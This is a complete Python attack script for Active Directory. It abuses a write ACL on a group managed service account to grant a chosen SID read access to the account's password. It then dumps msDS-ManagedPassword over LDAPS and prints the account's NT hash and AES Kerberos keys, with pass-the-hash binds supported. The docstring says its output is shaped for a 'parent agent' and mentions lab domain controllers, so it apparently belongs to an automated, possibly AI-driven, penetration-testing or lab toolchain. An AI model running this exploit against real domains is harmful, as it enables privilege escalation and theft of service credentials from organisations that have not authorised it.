#!/usr/bin/env python3
"""gmsa_grant_and_dump.py — atomic gMSA takeover helper.

Two-step takeover used when an attacker holds a write ACL
(GenericWrite/GenericAll/WriteDACL/WriteOwner/WriteProperty) on a gMSA
object but no read on msDS-ManagedPassword:

  1. WRITER bind   →  patch msDS-GroupMSAMembership to grant <grantee_sid> RP/WP
                      access (the write-up's grant_gmsa_read.py recipe).
  2. READER bind   →  pull msDS-ManagedPassword over LDAPS, parse the
                      MSDS_MANAGEDPASSWORD_BLOB, MD4 the current password
                      → NT hash, plus aes128/aes256 keys via krb5 string_to_key.

The two binds may use different identities — that's the entire point
of the chain (a Protected Users writer can grant a non-protected reader,
or vice versa). NTLM and Kerberos are both supported per side; pass
``--reader-kerberos`` / ``--writer-kerberos`` to switch.

Output is structured so the parent agent can grep for the result:

    [WRITE-OK] sid=S-1-5-21-... mask=983551
    [HASH] target_gmsa$:::aad3b435b51404eeaad3b435b51404ee:<nt_hash>:::
    [AES256] target_gmsa$:aes256-cts-hmac-sha1-96:<hex>
    [AES128] target_gmsa$:aes128-cts-hmac-sha1-96:<hex>

Designed to be wrapped in `faketime` by the parent so KRB5 ticket clocks
align with skewed lab DCs. Standalone (only stdlib + ldap3 + impacket +
pycryptodome).
"""
from __future__ import annotations

import argparse
import os
import sys
import traceback
from binascii import hexlify

import ldap3
from ldap3 import ALL, SASL, KERBEROS, NTLM, SUBTREE, MODIFY_REPLACE, Connection, Server
from ldap3.core.exceptions import LDAPException
from Cryptodome.Hash import MD4
from impacket.ldap import ldaptypes
from impacket.structure import Structure
from impacket.krb5 import constants
from impacket.krb5.crypto import string_to_key


# RP (ReadProperty) | WP (WriteProperty) | RC (ReadControl) etc.
# 983551 == 0xF01FF; matches what gMSADumper checks for and what AD accepts
# for read/write property grants on the managed password membership descriptor.
DEFAULT_MASK = 983551


class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version', '<H'),
        ('Reserved', '<H'),
        ('Length', '<L'),
        ('CurrentPasswordOffset', '<H'),
        ('PreviousPasswordOffset', '<H'),
        ('QueryPasswordIntervalOffset', '<H'),
        ('UnchangedPasswordIntervalOffset', '<H'),
        ('CurrentPassword', ':'),
        ('PreviousPassword', ':'),
        ('QueryPasswordInterval', ':'),
        ('UnchangedPasswordInterval', ':'),
    )

    def fromString(self, data):
        Structure.fromString(self, data)
        if self['PreviousPasswordOffset'] == 0:
            endData = self['QueryPasswordIntervalOffset']
        else:
            endData = self['PreviousPasswordOffset']
        self['CurrentPassword'] = self.rawData[
            self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
        if self['PreviousPasswordOffset'] != 0:
            self['PreviousPassword'] = self.rawData[
                self['PreviousPasswordOffset']:][
                :self['QueryPasswordIntervalOffset'] - self['PreviousPasswordOffset']]
        self['QueryPasswordInterval'] = self.rawData[
            self['QueryPasswordIntervalOffset']:][
            :self['UnchangedPasswordIntervalOffset'] - self['QueryPasswordIntervalOffset']]
        self['UnchangedPasswordInterval'] = self.rawData[
            self['UnchangedPasswordIntervalOffset']:]


def _base_dn(domain: str) -> str:
    return ",".join(f"DC={p}" for p in domain.split(".") if p)


def _bind(server: Server, *, kerberos: bool, domain: str, user: str,
          password: str | None, nt_hash: str | None) -> Connection:
    """Open an authenticated ldap3 Connection. Auto-fall through TLS for read.

    NTLM accepts plaintext password OR ``aad3b...:NT`` hash string.
    Kerberos uses KRB5CCNAME from the environment (so faketime + a fresh
    ccache should be set by the caller).
    """
    if kerberos:
        if not os.environ.get("KRB5CCNAME"):
            raise RuntimeError("kerberos requested but KRB5CCNAME is unset")
        return Connection(server, authentication=SASL,
                          sasl_mechanism=KERBEROS, auto_bind=True,
                          receive_timeout=20)

    if not user:
        raise RuntimeError("NTLM bind requires --writer-user / --reader-user")
    if nt_hash and not password:
        # Standard NTLM-with-hash form (LM:NT) — ldap3 NTLM accepts this.
        password = f"aad3b435b51404eeaad3b435b51404ee:{nt_hash.strip().split(':')[-1]}"
    if not password:
        raise RuntimeError("NTLM bind requires either --writer-pass or --writer-hash")
    return Connection(server,
                      user=f"{domain}\\{user}",
                      password=password,
                      authentication=NTLM,
                      auto_bind=True,
                      receive_timeout=20)


def _find_gmsa_dn(conn: Connection, domain: str, sam_or_dn: str) -> str:
    """Resolve a gMSA sAMAccountName (with or without '$') or DN to its full DN."""
    if sam_or_dn.lower().startswith("cn="):
        return sam_or_dn
    sam = sam_or_dn.rstrip("$") + "$"
    conn.search(_base_dn(domain),
                f"(&(objectClass=msDS-GroupManagedServiceAccount)"
                f"(sAMAccountName={sam}))",
                attributes=["sAMAccountName"])
    if not conn.entries:
        raise RuntimeError(f"gMSA {sam!r} not found via LDAP search")
    return conn.entries[0].entry_dn


def _build_security_descriptor(grantee_sid: str, mask: int) -> bytes:
    """Build the binary SR_SECURITY_DESCRIPTOR used by msDS-GroupMSAMembership."""
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd['Revision'] = b'\x01'
    sd['Sbz1'] = b'\x00'
    sd['Control'] = 32772  # SE_DACL_PRESENT | SE_SELF_RELATIVE
    sd['OwnerSid'] = ldaptypes.LDAP_SID()
    sd['OwnerSid'].fromCanonical('S-1-5-18')  # SYSTEM (matches default)
    sd['GroupSid'] = b''
    sd['Sacl'] = b''

    acl = ldaptypes.ACL()
    acl['AclRevision'] = 4
    acl['Sbz1'] = 0
    acl['Sbz2'] = 0

    ace = ldaptypes.ACE()
    ace['AceType'] = 0  # ACCESS_ALLOWED_ACE
    ace['AceFlags'] = 0
    nace = ldaptypes.ACCESS_ALLOWED_ACE()
    nace['Mask'] = ldaptypes.ACCESS_MASK()
    nace['Mask']['Mask'] = mask
    nace['Sid'] = ldaptypes.LDAP_SID()
    nace['Sid'].fromCanonical(grantee_sid)
    ace['Ace'] = nace

    acl.aces = [ace]
    sd['Dacl'] = acl
    return sd.getData()


def _emit_keys(sam: str, current_password: bytes, domain: str) -> None:
    """Emit NT hash + AES256/AES128 in the canonical gMSADumper layout."""
    ntlm_hash = MD4.new()
    ntlm_hash.update(current_password)
    nt = hexlify(ntlm_hash.digest()).decode("utf-8")
    print(f"[HASH] {sam}:::aad3b435b51404eeaad3b435b51404ee:{nt}:::")

    pw_utf8 = current_password.decode('utf-16-le', 'replace').encode('utf-8')
    salt = f"{domain.upper()}host{sam[:-1].lower()}.{domain.lower()}"
    aes256 = hexlify(string_to_key(
        constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
        pw_utf8, salt).contents).decode()
    aes128 = hexlify(string_to_key(
        constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
        pw_utf8, salt).contents).decode()
    print(f"[AES256] {sam}:aes256-cts-hmac-sha1-96:{aes256}")
    print(f"[AES128] {sam}:aes128-cts-hmac-sha1-96:{aes128}")


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--dc", required=True, help="DC IP or FQDN (LDAPS recommended)")
    p.add_argument("--domain", required=True)
    p.add_argument("--gmsa", required=True, help="gMSA sAMAccountName (with or without trailing $)")

    # Writer: must have a write ACL on the gMSA
    p.add_argument("--writer-user")
    p.add_argument("--writer-pass")
    p.add_argument("--writer-hash")
    p.add_argument("--writer-kerberos", action="store_true")

    # Reader: must hold (or be granted) the SID we set in SDDL
    p.add_argument("--reader-user")
    p.add_argument("--reader-pass")
    p.add_argument("--reader-hash")
    p.add_argument("--reader-kerberos", action="store_true")

    # Grant target — usually the reader's SID. Can be a different SID (e.g.
    # writer grants a teammate). When omitted, the writer grants itself.
    p.add_argument("--grantee-sid", required=True)
    p.add_argument("--mask", type=int, default=DEFAULT_MASK)

    p.add_argument("--skip-write", action="store_true",
                   help="Just dump (assume SDDL already grants reader)")
    p.add_argument("--skip-read", action="store_true",
                   help="Just write (don't try to dump)")
    p.add_argument("--port", type=int, default=636,
                   help="636 (LDAPS, default — required for msDS-ManagedPassword) or 389")

    args = p.parse_args()

    use_ssl = args.port == 636

    server = Server(args.dc, port=args.port, use_ssl=use_ssl,
                    get_info=ALL, connect_timeout=15)

    # ── 1. WRITE ─────────────────────────────────────────────────────────────
    if not args.skip_write:
        try:
            wconn = _bind(server,
                          kerberos=args.writer_kerberos,
                          domain=args.domain,
                          user=args.writer_user,
                          password=args.writer_pass,
                          nt_hash=args.writer_hash)
        except (LDAPException, Exception) as e:
            print(f"[WRITE-FAIL] writer bind: {e}", file=sys.stderr)
            return 2

        try:
            gmsa_dn = _find_gmsa_dn(wconn, args.domain, args.gmsa)
        except Exception as e:
            print(f"[WRITE-FAIL] resolve gmsa dn: {e}", file=sys.stderr)
            return 3

        sd_bytes = _build_security_descriptor(args.grantee_sid, args.mask)
        try:
            ok = wconn.modify(gmsa_dn,
                              {'msDS-GroupMSAMembership':
                                   [(MODIFY_REPLACE, [sd_bytes])]})
        except Exception as e:
            print(f"[WRITE-FAIL] modify exception: {e}", file=sys.stderr)
            try:
                wconn.unbind()
            except Exception:
                pass
            return 4

        if not ok:
            print(f"[WRITE-FAIL] dn={gmsa_dn} result={wconn.result}",
                  file=sys.stderr)
            try:
                wconn.unbind()
            except Exception:
                pass
            return 5

        print(f"[WRITE-OK] dn={gmsa_dn} sid={args.grantee_sid} mask={args.mask}")
        try:
            wconn.unbind()
        except Exception:
            pass

    # ── 2. READ ──────────────────────────────────────────────────────────────
    if args.skip_read:
        return 0

    try:
        rconn = _bind(server,
                      kerberos=args.reader_kerberos,
                      domain=args.domain,
                      user=args.reader_user,
                      password=args.reader_pass,
                      nt_hash=args.reader_hash)
    except (LDAPException, Exception) as e:
        print(f"[READ-FAIL] reader bind: {e}", file=sys.stderr)
        return 6

    try:
        sam = args.gmsa.rstrip("$") + "$"
        rconn.search(_base_dn(args.domain),
                     f"(&(objectClass=msDS-GroupManagedServiceAccount)"
                     f"(sAMAccountName={sam}))",
                     search_scope=SUBTREE,
                     attributes=["sAMAccountName", "msDS-ManagedPassword"])
        if not rconn.entries:
            print(f"[READ-FAIL] no entries for {sam}", file=sys.stderr)
            return 7
        entry = rconn.entries[0]
        if "msDS-ManagedPassword" not in entry or not entry["msDS-ManagedPassword"]:
            # Reader bind worked but DC refused the attribute — usually means
            # the SDDL grant has not propagated or the reader SID is wrong.
            print(f"[READ-FAIL] msDS-ManagedPassword empty (no read perm yet?)",
                  file=sys.stderr)
            return 8
        blob = MSDS_MANAGEDPASSWORD_BLOB()
        blob.fromString(entry["msDS-ManagedPassword"].raw_values[0])
        current = blob['CurrentPassword'][:-2]  # strip trailing UTF-16 null
        _emit_keys(entry['sAMAccountName'].value, current, args.domain)
        return 0
    except Exception as e:
        traceback.print_exc()
        print(f"[READ-FAIL] {e}", file=sys.stderr)
        return 9
    finally:
        try:
            rconn.unbind()
        except Exception:
            pass


if __name__ == "__main__":
    sys.exit(main())
